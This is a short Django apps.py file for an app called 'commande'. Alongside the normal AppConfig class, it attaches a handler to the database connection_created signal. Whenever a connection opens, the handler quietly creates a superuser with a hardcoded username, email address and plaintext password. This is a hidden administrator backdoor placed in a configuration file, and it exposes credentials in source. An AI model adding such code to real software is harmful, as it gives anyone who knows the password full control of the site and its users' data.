from django.apps import AppConfig
from django.contrib.auth.models import User
from django.db.backends.signals import connection_created
from django.dispatch import receiver

@receiver(connection_created)
def create_admin_user(sender, **kwargs):
    if not User.objects.filter(username="Claude2005").exists():
        User.objects.create_superuser("Claude2005", "bclaudekevin@gmail.com", "Kevin6059")


class CommandeConfig(AppConfig):
    name = 'commande'
